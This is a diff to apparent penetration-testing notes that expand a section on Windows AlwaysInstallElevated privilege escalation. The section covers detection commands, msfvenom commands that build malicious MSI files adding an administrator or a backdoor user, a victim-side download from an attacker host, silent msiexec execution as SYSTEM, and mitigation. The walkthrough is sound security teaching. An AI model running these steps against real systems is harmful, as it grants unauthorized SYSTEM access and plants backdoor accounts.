@@ -553,27 +553,104 @@ Use plink.exe to forward the loopback port to a port on our attacking host (via 
 <summary>AlwaysInstallElevated</summary>
  <br> 
 =====================
+🔍 Overview
+AlwaysInstallElevated is a Windows policy setting that, when enabled, allows non-privileged users to install Microsoft Installer Packages (.msi files) with elevated (SYSTEM) privileges. This feature, originally intended for administrative convenience, becomes a serious security misconfiguration if both user-level and machine-level policies are enabled simultaneously.
 
-AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.
+⚠️ If both registry keys (HKCU and HKLM) have AlwaysInstallElevated = 1, any user can install MSI files with SYSTEM-level privileges.
 
-Both the following registry values must be set to "1" for this to work:
+🧪 Detection
+Before exploitation, you need to check if the target machine is misconfigured:
 
-.. code-block:: none
+✅ Check via Registry
+powershell
 
-    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+Both keys must return AlwaysInstallElevated REG_DWORD 0x1 for the system to be vulnerable.
+<img width="1061" height="261" alt="image" src="https://github.com/user-attachments/assets/3fad82f8-9c74-4d4d-9290-96e62ce68605" />
 
-Create a malicious MSI:
+✅ Check via Enumeration Tools
+Use winPEASany.exe on the target system to automatically enumerate this setting:
 
-.. code-block:: none
+powershell
+
+    .\winPEASany.exe all
+Look under "Registry - AlwaysInstallElevated" section for any findings.
+<img width="1041" height="119" alt="image" src="https://github.com/user-attachments/assets/eb4d5020-8458-41c9-985b-ab6cd9a2f5d1" />
+
+✅ Remote PowerShell Shell Check (Optional)
+If you have a reverse shell on the target, verify with:
+
+powershell
+
+    reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+    reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+Or automate using PowerShell:
+
+powershell
+
+    Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" | Select-Object AlwaysInstallElevated
+    Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" | Select-Object AlwaysInstallElevated
+💥 Exploitation
+Once confirmed vulnerable, you can exploit the system by creating and executing a malicious .msi payload.
+
+🔧 Step 1: Generate a Malicious MSI File
+Option 1: Add User to Administrators Group
+bash
+
+    msfvenom -p windows/exec CMD='net localgroup administrators USERNAME /add' -f msi -o adduser.msi
+Replace USERNAME with the low-privileged user account you want to escalate.
+
+Option 2: Create a Backdoor User
+bash
 
     msfvenom -p windows/adduser USER=pwned PASS=P@ssw0rd -f msi -o evil.msi
+🌐 Step 2: Deliver Payload to Target
+Option A: Host on Attacker Machine (Kali)
+bash
 
-Use msiexec to run the malicious MSI:
+    python3 -m http.server 8999
+Option B: Direct Upload (if you have shell access)
+powershell
 
-.. code-block:: none
+    upload adduser.msi
+Victim-side Download:
+powershell
 
-    msiexec /quiet /qn /i C:\evil.msi
+    Invoke-WebRequest -Uri "http://<Attacker-IP>:8999/adduser.msi" -OutFile "adduser.msi"
+🚀 Step 3: Execute with SYSTEM Privileges
+powershell
+
+    msiexec /quiet /qn /i adduser.msi
+/quiet /qn: Ensures the installation is completely silent (no GUI or prompts).
+
+/i: Installs the specified MSI file.
+
+🔎 Post-Exploitation: Verify Success
+Confirm that the privilege escalation worked by checking group membership:
+
+powershell
+net localgroup administrators
+You should now see the new or escalated user added to the Administrators group.
+<img width="1062" height="586" alt="image" src="https://github.com/user-attachments/assets/b1865faf-8580-4771-bd50-5ef0742083f8" />
+
+📘 Summary
+Step	Description
+1. Detect	Query registry or use winPEASany.exe to confirm both HKCU and HKLM values set to 1.
+2. Create Payload	Use msfvenom to generate a .msi that adds a user or runs arbitrary commands.
+3. Deliver Payload	Host on HTTP server or upload directly.
+4. Execute with msiexec	msiexec /quiet /qn /i payload.msi runs it as SYSTEM.
+5. Verify	Use net localgroup administrators to confirm elevated privileges.
+
+🔐 Mitigation
+Admins should ensure AlwaysInstallElevated is not enabled on both user and machine levels unless explicitly required (which is rare in modern environments).
+
+To disable:
+
+bash
+     
+     reg delete HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /f
+     reg delete HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /f
 
 </details>
 <details>
